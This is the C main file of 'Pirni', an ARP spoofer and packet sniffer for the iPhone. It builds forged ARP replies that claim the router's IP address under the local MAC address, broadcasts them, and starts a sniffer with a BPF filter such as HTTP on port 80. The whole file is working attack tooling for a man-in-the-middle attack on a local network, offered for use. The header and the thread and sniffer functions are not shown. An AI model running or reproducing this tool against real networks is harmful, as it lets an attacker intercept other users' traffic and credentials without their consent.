/* Pirni ARP poisoning and packet sniffing v0.1 -- n1mda, for the iPhone
	compile with gcc pirni.c -o pirni -lpcap -lnet -pthread */
	
#include "pirni.h"

void print_usage(char *name)
{
	printf("Pirni ARP Spoofer and packet sniffer v0.1\n\n");
	printf("Usage:\t%s -i interface -s source_ip -b broadcast_ip -f [BPF_Filer]\n", name);
	printf("Ex:\t%s -i en0 -s 192.168.0.1 -b 255.255.255.255 -f 'tcp dst port 80'\n", name);
	
	return;
}

int main(int argc, char *argv[])
{
	/* Libnet init and headers */
	libnet_ptag_t	eth_tag, arp_tag;
	
	/* Error buffer and device */
	char			errbuf[LIBNET_ERRBUF_SIZE];
	char			*BPFfilter;
	static u_char	SrcHW[ETH_ALEN];
	//static u_char	DstHW[ETH_ALEN]					= {0x00, 0x23, 0x12, 0xc1, 0xec, 0xae};
	static u_char	DstHW[ETH_ALEN]					= {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	int c;


	/* Structure for local MAC */
	struct libnet_ether_addr *local_mac;
	
	if(getuid()) {
		printf("Must run as root\n");
		exit(1);
	}
	
	while((c = getopt(argc, argv, "di:s:b:f:o:")) != -1) {
		switch(c) {
			case 'd':
						//arpSpoof = FALSE;
						break;
			case 'i':
						device = optarg;
						break;
			case 's':
						routerIP = optarg;
						SrcIP = inet_addr(optarg);
						break;
			case 'b':
						DstIP = inet_addr(optarg);
						break;
			case 'f':
						BPFfilter = optarg;
						break;
			case 'o':
						outputFile = optarg;
						break;
			case '?':
						printf("Unrecognized option: -%c\n", optopt);
						exit(2);
						break;
			default:
						print_usage(argv[0]);
						exit(2);
					}
				}


	if(device == NULL) {
		print_usage(argv[0]);
		exit(2);
	}
	if(BPFfilter == NULL) {
		BPFfilter = "";
	}
	
	printf("[+] Initializing libnet on %s\n", device);
	l = libnet_init(LIBNET_LINK, device, errbuf);
	if(l == NULL) {
		printf("[-] libnet_init() failed: %s\n", errbuf);
		exit(1);
	}
	
	/* Get local MAC address */
	local_mac = libnet_get_hwaddr(l);
	if(local_mac != NULL) {
		printf("[*] Your MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n", \
									local_mac->ether_addr_octet[0],\
									local_mac->ether_addr_octet[1],\
									local_mac->ether_addr_octet[2],\
									local_mac->ether_addr_octet[3],\
									local_mac->ether_addr_octet[4],\
									local_mac->ether_addr_octet[5]);
		memcpy(SrcHW, local_mac, ETH_ALEN);
	} else {
		printf("[-] Could not parse your own MAC address: %s\n", libnet_geterror(l));
		libnet_destroy(l);
		return 0;
	}

	/* Create ARP header */
	printf("[+] Creating ARP header\n");
	arp_tag = libnet_build_arp(
				1,						/* hardware type */
				0x0800,					/* proto type */
				6,						/* hw addr size */
				4,						/* proto addr size */
				ARP_REPLY,				/* ARP OPCODE */
				SrcHW,					/* source HW addr */
				(u_char *)&SrcIP,		/* src proto addr */
				DstHW,					/* dst HW addr */
				(u_char *)&DstIP,		/* dst IP addr */
				NULL,					/* no payload */
				0,						/* payload length */
				l,						/* libnet tag */
				0);						/* ptag see man */

	if(arp_tag == -1) {
		printf("[-] libnet_build_arp() failed: %s\n", libnet_geterror(l));
		exit(1);
	}
	
	/* Create Ethernet header */
	printf("[+] Creating Ethernet header\n");
	eth_tag = libnet_build_ethernet(
				DstHW,					/* dst HW addr */
				SrcHW,					/* src HW addr */
				0x0806,					/* Ether packet type */
				NULL,					/* pointer to payload */
				0,						/* payload size */
				l,						/* libnet tag */
				0);						/* Pointer to packet memory */
	
	if(eth_tag == -1) {
		printf("libnet_build_ethernet() failed: %s\n", libnet_geterror(l));
		exit(1);
	}
	
	/* Send ARP request */

	LaunchThread();
	initSniffer(BPFfilter);
	
	libnet_destroy(l);
	return 0;
}